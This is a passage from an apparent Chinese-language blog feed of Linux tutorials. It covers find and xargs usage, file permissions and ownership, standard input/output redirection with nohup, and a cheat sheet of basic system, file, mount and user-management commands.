src="640-1689664910913-225.png" alt="图片"></p><p> 8、group与nogroup选项（同上）</p><p><img src="640-1689664912261-228.png" alt="图片"></p><p> 9、查找出比某个文件新或旧的文件</p><p>find . -newer dir3 #查找比dir3新的文件</p><p>find . -newer dir1 ! -newer dir2 #查找比dir1新 但比dir2旧的文件</p><p><img src="640-1689664914215-231.png" alt="图片"></p><p> 10、逻辑操作符</p><p>[root@localhost mytest1]# find . -maxdepth 1 -type d #遍历1层，类似tree -L 1</p><p><img src="640-1689664915705-234.png" alt="图片"></p><p> 11、正则表达式</p><p>[root@localhost mytest1]# find . -regex “dir” #完全匹配路径为dir，无结果</p><p>[root@localhost mytest1]# find . -regex “.*dir” #匹配后缀</p><p>[root@localhost mytest1]# find . -regex “.*/dir” #匹配/dir后缀</p><p><img src="640-1689664917960-237.png" alt="图片"></p><p>12、查找并打印</p><p>[root@localhost mytest8]# find . -type f -exec ls -l {} ;</p><p><img src="640-1689664920180-240.png" alt="图片"></p><p>13、查找n天前文件并删除</p><p>[root@localhost mytest8]# find . -type f -mtime +2 -exec rm {} ;</p><p><img src="640-1689664921633-243.png" alt="图片"></p><p> 14、-exec选项安全模式-ok</p><p>[root@localhost mytest8]# find . -type f -mtime +2 -ok rm {} ;</p><p><img src="640-1689664923054-246.png" alt="图片"></p><p> 15、find+xargs过滤</p><p>[root@localhost mytest8]# find . -type f | xargs ls -l #传递查找并显示</p><p><img src="640-1689664924608-249.png" alt="图片"></p><p>[root@localhost mytest8]# find . -name ‘*.txt’ | xargs -i mv {} testdir/ #查找传递并移动</p><p> <img src="640-1689664926789-252.png" alt="图片"></p><p> [root@localhost mytest8]# find . -name ‘<em>dir</em>‘ |xargs -p rm -f #需要确认y、n并删除</p><p> <img src="640-1689664928500-255.png" alt="图片"></p><p> 16、案例，将目录下所有扩展名.txt文件内test001替换为test002</p><p>方法（一）</p><p>[root@localhost mytest8]# find . -name ‘*.txt’ -exec sed -i ‘s#test001#test002#g’ {} ;</p><p> <img src="640-1689664929874-258.png" alt="图片"></p><p>方法（二）</p><p>[root@localhost mytest8]# find . -name ‘*.txt’|xargs sed -i ‘s#test001#test002#g’</p><p> <img src="640-1689664931408-261.png" alt="图片"></p><p>方法（三）：高效方法（反引号优先执行）</p><p>[root@localhost mytest8]# sed -i ‘s#test001#test002#g’ <code>find . -name &#39;*.txt&#39;</code></p><p><img src="640-1689664932859-264.png" alt="图片"></p><p> 17、删除所有文件但保留其中一个指定的文件</p><p>方法（一）：</p><p>[root@localhost mytest8]# find . -type f ! -name ‘dir5.txt’ | xargs rm -f</p><p><img src="640-1689664934355-267.png" alt="图片"></p><p>方法（二）：</p><p>[root@localhost mytest8]# find . -type f ! -name ‘dir5.txt’ -exec rm -f {} ;</p><p><img src="640-1689664936115-270.png" alt="图片"></p><p>十四、xargs：将标准输入转换成命令行参数</p><p>预置数据：</p><p><img src="640-1689664937795-273.png" alt="图片"></p><p>1、[root@localhost mytest8]# xargs &lt; test001.txt #所有数字一行显示</p><p><img src="640-1689664939252-276.png" alt="图片"></p><p>2、[root@localhost mytest8]# xargs -n 3 &lt; test001.txt #每行输出3个</p><p><img src="640-1689664941031-279.png" alt="图片"></p><p> 3、echo splitXsplitXsplitXsplitX</p><p><img src="640-1689664942703-282.png" alt="图片"></p><p>[root@localhost mytest8]# echo splitXsplitXsplitXsplitX|xargs -d X #以X作为分隔符</p><p> <img src="640-1689664945507-285.png" alt="图片"></p><p>[root@localhost mytest8]# echo splitXsplitXsplitXsplitX|xargs -d X -n2 #每行显示2 #以X作为分隔符，每行显示2</p><p> <img src="640-1689664947003-288.png" alt="图片"></p><p> 4、xargs -i：指定一个符号替代前面的结果</p><p>[root@localhost mytest8]# find . -name ‘test*’ | xargs -I [] cp [] dir/</p><p><img src="640-1689664951745-291.png" alt="图片"></p><p>十五、rename：重命名</p><p>预置：</p><p><img src="640-1689664953505-294.png" alt="图片"></p><p> 1、[root@localhost mytest8]# rename ‘_finished’ ‘’ * #将所有文件_finished替换为空</p><p><img src="640-1689664955237-297.png" alt="图片"></p><p> 2、[root@localhost mytest8]# rename .jpg .hello *.jpg #将所有.jpg替换为.hello</p><p><img src="640-1689664956656-300.png" alt="图片"></p><p>十六、basename：显示文件名或目录名</p><p>1、[root@localhost mytest8]# basename dir1/dir2/dir3/test001.txt #去除路径部分</p><p><img src="640-1689664958121-303.png" alt="图片"></p><p>[root@localhost mytest8]# basename dir1/dir2/dir3/test001.txt .txt #去除路径部分，并去除后缀</p><p> <img src="640-1689664961066-306.png" alt="图片"></p><p>十七、dirname：显示文件或目录路径</p><p>1、[root@localhost mytest8]# dirname dir1/dir2/dir3/test001.txt</p><p><img src="640-1689664962775-309.png" alt="图片"></p><p> 2、[root@localhost mytest8]# dirname test001.txt #根据路径返回相对路径</p><p><img src="640-1689664964769-312.png" alt="图片"></p><p>十八、chattr：改为文件扩展属性</p><p>1、[root@localhost mytest8]# chattr +a test001.txt #只能添加数据，不能删除</p><p><img src="640-1689664966461-315.png" alt="图片"></p><p> 2、[root@localhost mytest8]# chattr +i test001.txt #添加只读属性</p><p><img src="640-1689664968297-318.png" alt="图片"></p><p>十九、lsattr：查看文件属性</p><p>1、[root@localhost mytest8]# lsattr test001.txt #查看文件</p><p><img src="640-1689664970363-321.png" alt="图片"></p><p>2、[root@localhost mytest8]# lsattr -d testdir/ #查看目录</p><p><img src="640-1689664972896-324.png" alt="图片"></p><p>二十、file：显示文件类型</p><p><img src="640-1689664974801-327.png" alt="图片"></p><p>二十一、md5sum：计算与校验文件MD5值</p><p>1、生成一个文件的md5</p><p>[root@localhost mytest8]# md5sum test001.txt</p><p><img src="640-1689664976413-330.png" alt="图片"></p><p> 2、检测文件是否改变</p><p>[root@localhost mytest8]# md5sum -c md5.log</p><p><img src="640-1689664979473-333.png" alt="图片"></p><p>二十二、chown：改为文件或目录的用户和用户组</p><p>1、更改文件所属的用户组‘</p><p>[root@localhost mytest8]# chown baikang test001.txt</p><p><img src="640-1689664981700-336.png" alt="图片"></p><p> 2、更改文件所属的用户组的属性</p><p>[root@localhost mytest8]# chown .baikang test001.txt</p><p>[root@localhost mytest8]# chown :baikang test001.txt</p><p><img src="640-1689664983966-339.png" alt="图片"></p><p> 3、同时更改文件所属的用户和组的属性</p><p>[root@localhost mytest8]# chown baikang.root test001.txt</p><p><img src="640-1689664986366-342.png" alt="图片"></p><p> 4、递归更改目录下的所有目录文件的用户和用户组属性</p><p>[root@localhost ~]# chown -R baikang:baikang mytest20201204/</p><p><img src="640-1689664988235-345.png" alt="图片"></p><p>二十三、chmod：改变文件或目录权限</p><p>1、设置权限为空</p><p>[root@localhost mytest1]# chmod a= test.txt test.txt</p><p><img src="640-1689664993283-348.png" alt="图片"></p><p> 2、设置usr文件属主执行权限</p><p>[root@localhost mytest1]# chmod u+x test.txt</p><p><img src="640-1689665000204-351.png" alt="图片"></p><p> 3、设置group文件用户组可写权限</p><p>[root@localhost mytest1]# chmod g+u test.txt</p><p><img src="640-1689665004662-354.png" alt="图片"></p><p> 4、设置other其他用户可读权限</p><p>[root@localhost mytest1]# chmod o+r test.txt</p><p><img src="640-1689665006894-357.png" alt="图片"></p><p> 5、设置多权限</p><p>[root@localhost mytest1]# chmod a= test.txt<br>[root@localhost mytest1]# chmod ug+r,o+r test.txt</p><p><img src="640-1689665012672-360.png" alt="图片"></p><p> 6、常用权限</p><p>目录：755</p><p>文件：644</p><p>全量：777</p><p>二十四、chgrp：更改文件用户组</p><p>1、chgrp testuser test.txt  #更改文件</p><p>2、chgrp -R root dir/ #递归更改目录下文件</p><p>二十五、umask：显示或设置权限掩码</p><p>1、文件权限=666-掩码</p><p>2、目录权限=777-掩码</p><p>3、root用户默认掩码：0022</p><p><img src="640-1689665014797-363.png" alt="图片"></p><p> 4、普通用户默认掩码：0002</p><p><img src="640-1689665016867-366.png" alt="图片"></p><p> 5、umask 044 #临时生效</p><p><img src="640-1689665019781-369.png" alt="图片"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux的标准输入和输出</title>
    <link href="/2023/07/18/Linux%E7%9A%84%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA/"/>
    <url>/2023/07/18/Linux%E7%9A%84%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<p><strong>一、Linux提供了三种输入/输出通道给程序</strong><br>在linux中，每个进程都会有三个文件，并且这三个文件会进行重定向处理:<br><strong>1. 标准输入(STDIN) - 缺省为键盘</strong><br><strong>2. 标准输出(STDOUT) - 默认为终端窗口</strong><br><strong>3. 标准错误(STDERR) - 默认为终端窗口</strong></p><p><img src="640.png" alt="图片"></p><p><strong>4. 2&gt;&amp;1中的数字就是上面重定向后的数字</strong><br>　　0： 表示键盘输入<br>　　1：将信息输入到屏幕(一般linux命令都是默认为1)<br>　　2：将信息输入到错误输出</p><p><strong>二、标准输出和标准错误能重定向到文件中:</strong> </p><p><strong>1. 命令 &gt; 文件：重定向标准输出到文件</strong></p><p><strong>2. 命令 2&gt; 文件：重定向标准错误到文件</strong></p><p><strong>3. 命令 &amp;&gt; 文件：重定向所有的输出到文件</strong></p><p>ps：使用&gt;时会将文件内容会覆盖，使用&gt;&gt;时文件内容追加</p><p><strong>三、示例：重定向输出给一个文件示例</strong></p><p>当前文件夹存在内容为hello world的test001.txt的文件，但是没有test002.txt</p><p><strong>1. cat两个文件时将标准输出与标准错误至控制台：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> test001.txt test002.txt<br></code></pre></td></tr></table></figure><p> <img src="640-1689664605011-3.png" alt="图片"></p><p><strong>2. 重定向标准输出到文件，不包含标准错误</strong> </p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> test001.txt test002.txt  &gt; 1.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><p><img src="640-1689664606472-6.png" alt="图片"></p><p><strong>3. 重定向标准错误到文件</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> test001.txt test002.txt  <span class="hljs-number">2</span>&gt; <span class="hljs-number">1</span>.out<br></code></pre></td></tr></table></figure><p><img src="640-1689664607863-9.png" alt="图片"></p><p> <strong>4. 重定向准输出与标准错误输出至文件</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> test001.txt test002.txt  &amp;&gt; 1.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><p><img src="640-1689664609417-12.png" alt="图片"></p><p> <strong>5. 重定向准输出与标准错误输出至两个不同的文件</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> test001.txt test002.txt  &gt; <span class="hljs-number">1</span>.out  <span class="hljs-number">2</span>&gt; <span class="hljs-number">2</span>.out<br></code></pre></td></tr></table></figure><p><img src="640-1689664610989-15.png" alt="图片"></p><p><strong>四、常见用法:</strong></p><p><strong>1. 后台程序运行并，并将日志保存至默认地址nohup.out：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nohup</span> java -jar wiremock-jre8-standalone-<span class="hljs-number">2</span>.<span class="hljs-number">33</span>.<span class="hljs-number">2</span>.jar --port <span class="hljs-number">7777</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br></code></pre></td></tr></table></figure><p>nohup 命令含义：运行由 Command参数和任何相关的 Arg参数指定的命令，忽略所有挂断（SIGHUP）信号。在注销后使用 nohup 命令运行后台中的程序。要运行后台中的 nohup 命令，添加 &amp; （ 表示“and”的符号）到命令的尾部<br>如果不将 nohup 命令的输出重定向，输出将附加到当前目录的 nohup.out 文件中。如果当前目录的 nohup.out 文件不可写，输出重定向到 $HOME/nohup.out 文件中</p><p><img src="640-1689664612696-18.png" alt="图片"></p><p><strong>2. 同上的命令简化命令，日志保存至log日志内：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nohup</span> java -jar wiremock-jre8-standalone-<span class="hljs-number">2</span>.<span class="hljs-number">33</span>.<span class="hljs-number">2</span>.jar --port <span class="hljs-number">7777</span> &amp;&gt;log &amp;<br></code></pre></td></tr></table></figure><p><img src="640-1689664614479-21.png" alt="图片"></p><p><strong>3. 后台程序运行，并在日志输入至黑洞，即不保存日志：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nohup</span> java -jar wiremock-jre8-standalone-<span class="hljs-number">2</span>.<span class="hljs-number">33</span>.<span class="hljs-number">2</span>.jar --port <span class="hljs-number">7777</span> &gt;/dev/null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br></code></pre></td></tr></table></figure><p><img src="640-1689664616323-24.png" alt="图片"></p><p> <strong>4. 后台程序运行，分别将标准输出与标准错误写入不同的日志文件内。</strong></p><p><img src="640-1689664619747-27.png" alt="图片"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux基本命令+定时任务创建</title>
    <link href="/2023/07/18/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%88%9B%E5%BB%BA/"/>
    <url>/2023/07/18/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%88%9B%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>1、基本命令</p><figure class="highlight tcl"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><pre><code class="hljs tcl">uname -m 显示机器的处理器架构<br>uname -r 显示正在使用的内核版本<br>dmidecode -q 显示硬件系统部件<br>(SMBIOS / DMI) hdparm -i /dev/hda 罗列一个磁盘的架构特性<br>hdparm -tT /dev/sda 在磁盘上执行测试性读取操作系统信息<br>arch 显示机器的处理器架构<br>uname -m 显示机器的处理器架构<br>uname -r 显示正在使用的内核版本<br>dmidecode -q 显示硬件系统部件 - (SMBIOS / DMI)<br>hdparm -i /dev/hda 罗列一个磁盘的架构特性<br>hdparm -tT /dev/sda 在磁盘上执行测试性读取操作<br>cat /<span class="hljs-keyword">proc</span>/cpuinfo 显示CPU<span class="hljs-title"> info的信息</span><br>cat /<span class="hljs-keyword">proc</span>/interrupts 显示中断<span class="hljs-title"></span><br><span class="hljs-title">cat</span> /<span class="hljs-keyword">proc</span>/meminfo 校验内存使用<span class="hljs-title"></span><br><span class="hljs-title">cat</span> /<span class="hljs-keyword">proc</span>/swaps 显示哪些swap被使用<span class="hljs-title"></span><br><span class="hljs-title">cat</span> /<span class="hljs-keyword">proc</span>/version 显示内核的版本<span class="hljs-title"></span><br><span class="hljs-title">cat</span> /<span class="hljs-keyword">proc</span>/net/dev 显示网络适配器及统计<span class="hljs-title"></span><br><span class="hljs-title">cat</span> /<span class="hljs-keyword">proc</span>/mounts 显示已加载的文件系统<span class="hljs-title"></span><br><span class="hljs-title">lspci</span> -tv 罗列<span class="hljs-title"> PCI</span> 设备<span class="hljs-title"></span><br><span class="hljs-title">lsusb</span> -tv 显示<span class="hljs-title"> USB</span> 设备<span class="hljs-title"></span><br><span class="hljs-title">date</span> 显示系统日期<span class="hljs-title"></span><br><span class="hljs-title">cal</span> 2007 显示2007年的日历表<span class="hljs-title"></span><br><span class="hljs-title">date</span> 041217002007.00 设置日期和时间 - 月日时分年.秒<span class="hljs-title"></span><br><span class="hljs-title">clock</span> -w 将时间修改保存到<span class="hljs-title"> BIOS2、关机：</span><br>shutdown -h<span class="hljs-title"> now</span> 关闭系统(1)<span class="hljs-title"></span><br><span class="hljs-title">init</span> 0 关闭系统(2)<span class="hljs-title"></span><br><span class="hljs-title">telinit</span> 0 关闭系统(3)<span class="hljs-title"></span><br><span class="hljs-title">shutdown</span> -h<span class="hljs-title"> hours:minutes</span> &amp; 按预定时间关闭系统<span class="hljs-title"></span><br><span class="hljs-title">shutdown</span> -c 取消按预定时间关闭系统<span class="hljs-title"></span><br><span class="hljs-title">shutdown</span> -r<span class="hljs-title"> now</span> 重启(1)<span class="hljs-title"></span><br><span class="hljs-title">reboot</span> 重启(2)<span class="hljs-title"></span><br><span class="hljs-title">logout</span> 注销3、文件目录操作：<span class="hljs-title"></span><br><span class="hljs-title">cd</span> /home 进入 &#x27;/<span class="hljs-title"> home&#x27;</span> 目录&#x27;<span class="hljs-title"></span><br><span class="hljs-title">cd</span> .. 返回上一级目录<span class="hljs-title"></span><br><span class="hljs-title">cd</span> ../.. 返回上两级目录<span class="hljs-title"></span><br><span class="hljs-title">cd</span> 进入个人的主目录<span class="hljs-title"></span><br><span class="hljs-title">cd</span> ~user1 进入个人的主目录<span class="hljs-title"></span><br><span class="hljs-title">cd</span> - 返回上次所在的目录<span class="hljs-title"></span><br><span class="hljs-title">pwd</span> 显示工作路径<span class="hljs-title"></span><br><span class="hljs-title">ls</span> 查看目录中的文件<span class="hljs-title"></span><br><span class="hljs-title">ls</span> -F 查看目录中的文件<span class="hljs-title"></span><br><span class="hljs-title">ls</span> -l 显示文件和目录的详细资料<span class="hljs-title"></span><br><span class="hljs-title">ls</span> -a 显示隐藏文件<span class="hljs-title"></span><br><span class="hljs-title">ls</span> *[0-9]* 显示包含数字的文件名和目录名<span class="hljs-title"></span><br><span class="hljs-title">tree</span> 显示文件和目录由根目录开始的树形结构(1)<span class="hljs-title"></span><br><span class="hljs-title">lstree</span> 显示文件和目录由根目录开始的树形结构(2)<span class="hljs-title"></span><br><span class="hljs-title">mkdir</span> dir1 创建一个叫做 &#x27;dir1&#x27; 的目录&#x27;<span class="hljs-title"></span><br><span class="hljs-title">mkdir</span> dir1<span class="hljs-title"> dir2</span> 同时创建两个目录<span class="hljs-title"></span><br><span class="hljs-title">mkdir</span> -p /tmp/dir1/dir2 创建一个目录树<span class="hljs-title"></span><br><span class="hljs-title">rm</span> -f<span class="hljs-title"> file1</span> 删除一个叫做 &#x27;file1&#x27; 的文件&#x27;<span class="hljs-title"></span><br><span class="hljs-title">rmdir</span> dir1 删除一个叫做 &#x27;dir1&#x27; 的目录&#x27;<span class="hljs-title"></span><br><span class="hljs-title">rm</span> -rf<span class="hljs-title"> dir1</span> 删除一个叫做 &#x27;dir1&#x27; 的目录并同时删除其内容<span class="hljs-title"></span><br><span class="hljs-title">rm</span> -rf<span class="hljs-title"> dir1</span> dir2 同时删除两个目录及它们的内容<span class="hljs-title"></span><br><span class="hljs-title">mv</span> dir1<span class="hljs-title"> new_dir</span> 重命名/移动 一个目录<span class="hljs-title"></span><br><span class="hljs-title">cp</span> file1<span class="hljs-title"> file2</span> 复制一个文件<span class="hljs-title"></span><br><span class="hljs-title">cp</span> dir/* . 复制一个目录下的所有文件到当前工作目录<span class="hljs-title"></span><br><span class="hljs-title">cp</span> -a /tmp/dir1 . 复制一个目录到当前工作目录<span class="hljs-title"></span><br><span class="hljs-title">cp</span> -a<span class="hljs-title"> dir1</span> dir2 复制一个目录<span class="hljs-title"></span><br><span class="hljs-title">ln</span> -s<span class="hljs-title"> file1</span> lnk1 创建一个指向文件或目录的软链接<span class="hljs-title"></span><br><span class="hljs-title">ln</span> file1<span class="hljs-title"> lnk1</span> 创建一个指向文件或目录的物理链接<span class="hljs-title"></span><br><span class="hljs-title">touch</span> -t 0712250000<span class="hljs-title"> file1</span> 修改一个文件或目录的时间戳 - (YYMMDDhhmm)<span class="hljs-title"></span><br><span class="hljs-title">file</span> file1<span class="hljs-title"> outputs</span> the<span class="hljs-title"> mime</span> type<span class="hljs-title"> of</span> the<span class="hljs-title"> file</span> as<span class="hljs-title"> text</span><br>iconv -l 列出已知的编码<span class="hljs-title"></span><br><span class="hljs-title">iconv</span> -f<span class="hljs-title"> fromEncoding</span> -t<span class="hljs-title"> toEncoding</span> inputFile &gt;<span class="hljs-title"> outputFile</span> creates<span class="hljs-title"> a</span> new<span class="hljs-title"> from</span> the<span class="hljs-title"> given</span> input<span class="hljs-title"> file</span> by<span class="hljs-title"> assuming</span> it<span class="hljs-title"> is</span> encoded<span class="hljs-title"> in</span> fromEncoding<span class="hljs-title"> and</span> converting<span class="hljs-title"> it</span> to<span class="hljs-title"> toEncoding.</span><br>find . -maxdepth 1 -name *.jpg -print -exec<span class="hljs-title"> convert</span> &quot;&#123;&#125;<span class="hljs-string">&quot; -resize 80x60 &quot;</span>thumbs/&#123;&#125;<span class="hljs-string">&quot; \; batch resize files in the current directory and send them to a thumbnails directory (requires convert from Imagemagick)</span><br></code></pre></td></tr></table></figure><ol><li>查找</li></ol><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> file1 从 <span class="hljs-string">&#x27;/&#x27;</span> 开始进入根文件系统搜索文件和目录<br><span class="hljs-built_in">find</span> / -user user1 搜索属于用户 <span class="hljs-string">&#x27;user1&#x27;</span> 的文件和目录<br><span class="hljs-built_in">find</span> /home/user1 -<span class="hljs-built_in">name</span> \*.bin 在目录 <span class="hljs-string">&#x27;/ home/user1&#x27;</span> 中搜索带有<span class="hljs-string">&#x27;.bin&#x27;</span> 结尾的文件<br><span class="hljs-built_in">find</span> /usr/bin -<span class="hljs-built_in">type</span> f -atime +<span class="hljs-number">100</span> 搜索在过去<span class="hljs-number">100</span>天内未被使用过的执行文件<br><span class="hljs-built_in">find</span> /usr/bin -<span class="hljs-built_in">type</span> f -mtime -<span class="hljs-number">10</span> 搜索在<span class="hljs-number">10</span>天内被创建或者修改过的文件<br><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> \*.rpm -<span class="hljs-built_in">exec</span> chmod <span class="hljs-number">755</span> <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span> \; 搜索以 <span class="hljs-string">&#x27;.rpm&#x27;</span> 结尾的文件并定义其权限<br><span class="hljs-built_in">find</span> / -xdev -<span class="hljs-built_in">name</span> \*.rpm 搜索以 <span class="hljs-string">&#x27;.rpm&#x27;</span> 结尾的文件，忽略光驱、捷盘等可移动设备<br>locate \*.ps 寻找以 <span class="hljs-string">&#x27;.ps&#x27;</span> 结尾的文件 - 先运行 <span class="hljs-string">&#x27;updatedb&#x27;</span> 命令<br>whereis <span class="hljs-built_in">halt</span> 显示一个二进制文件、源码或man的位置<br>which <span class="hljs-built_in">halt</span> 显示一个二进制文件或可执行文件的完整路径<br></code></pre></td></tr></table></figure><ol><li>挂载一个文件系统</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">mount <span class="hljs-regexp">/dev/</span>hda2 <span class="hljs-regexp">/mnt/</span>hda2 挂载一个叫做hda2的盘 - 确定目录 <span class="hljs-string">&#x27;/ mnt/hda2&#x27;</span> 已经存在<br>umount <span class="hljs-regexp">/dev/</span>hda2 卸载一个叫做hda2的盘 - 先从挂载点 <span class="hljs-string">&#x27;/ mnt/hda2&#x27;</span> 退出<br>fuser -km <span class="hljs-regexp">/mnt/</span>hda2 当设备繁忙时强制卸载<br>umount -n <span class="hljs-regexp">/mnt/</span>hda2 运行卸载操作而不写入 <span class="hljs-regexp">/etc/m</span>tab 文件- 当文件为只读或当磁盘写满时非常有用<br>mount <span class="hljs-regexp">/dev/</span>fd0 <span class="hljs-regexp">/mnt/</span>floppy 挂载一个软盘<br>mount <span class="hljs-regexp">/dev/</span>cdrom <span class="hljs-regexp">/mnt/</span>cdrom 挂载一个cdrom或dvdrom<br>mount <span class="hljs-regexp">/dev/</span>hdc <span class="hljs-regexp">/mnt/</span>cdrecorder 挂载一个cdrw或dvdrom<br>mount <span class="hljs-regexp">/dev/</span>hdb <span class="hljs-regexp">/mnt/</span>cdrecorder 挂载一个cdrw或dvdrom<br>mount -o loop file.iso <span class="hljs-regexp">/mnt/</span>cdrom 挂载一个文件或ISO镜像文件<br>mount -t vfat <span class="hljs-regexp">/dev/</span>hda5 <span class="hljs-regexp">/mnt/</span>hda5 挂载一个Windows FAT32文件系统<br>mount <span class="hljs-regexp">/dev/</span>sda1 <span class="hljs-regexp">/mnt/u</span>sbdisk 挂载一个usb 捷盘或闪存设备<br>mount -t smbfs -o username=user,password=pass <span class="hljs-regexp">//</span>WinClient<span class="hljs-regexp">/share /m</span>nt/share 挂载一个windows网络共享<br></code></pre></td></tr></table></figure><ol><li>磁盘空间</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span> -h 显示已经挂载的分区列表<br><span class="hljs-built_in">ls</span> -lSr |more 以尺寸大小排列文件和目录<br><span class="hljs-built_in">du</span> -sh dir1 估算目录 <span class="hljs-string">&#x27;dir1&#x27;</span> 已经使用的磁盘空间<span class="hljs-string">&#x27;</span><br><span class="hljs-string">du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小</span><br><span class="hljs-string">rpm -q -a --qf &#x27;</span>%10&#123;SIZE&#125;t%&#123;NAME&#125;n<span class="hljs-string">&#x27; | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统)</span><br><span class="hljs-string">dpkg-query -W -f=&#x27;</span><span class="hljs-variable">$&#123;Installed-Size;10&#125;</span>t<span class="hljs-variable">$&#123;Package&#125;</span>n<span class="hljs-string">&#x27; | sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统)</span><br></code></pre></td></tr></table></figure><ol><li>用户和群组</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">groupadd group_name 创建一个新用户组<br>groupdel group_name 删除一个用户组<br>groupmod -n new_group_name old_group_name 重命名一个用户组<br>useradd -c <span class="hljs-string">&quot;Name Surname &quot;</span> -g admin -d <span class="hljs-regexp">/home/u</span>ser1 -s <span class="hljs-regexp">/bin/</span>bash user1 创建一个属于 <span class="hljs-string">&quot;admin&quot;</span> 用户组的用户<br>useradd user1 创建一个新用户<br>userdel -r user1 删除一个用户 ( <span class="hljs-string">&#x27;-r&#x27;</span> 排除主目录)<br>usermod -c <span class="hljs-string">&quot;User FTP&quot;</span> -g system -d <span class="hljs-regexp">/ftp/u</span>ser1 -s <span class="hljs-regexp">/bin/</span>nologin user1 修改用户属性<br>passwd 修改口令<br>passwd user1 修改一个用户的口令 (只允许root执行)<br>chage -E <span class="hljs-number">2005</span>-<span class="hljs-number">12</span>-<span class="hljs-number">31</span> user1 设置用户口令的失效期限<br>pwck 检查 <span class="hljs-string">&#x27;/etc/passwd&#x27;</span> 的文件格式和语法修正以及存在的用户<br>grpck 检查 <span 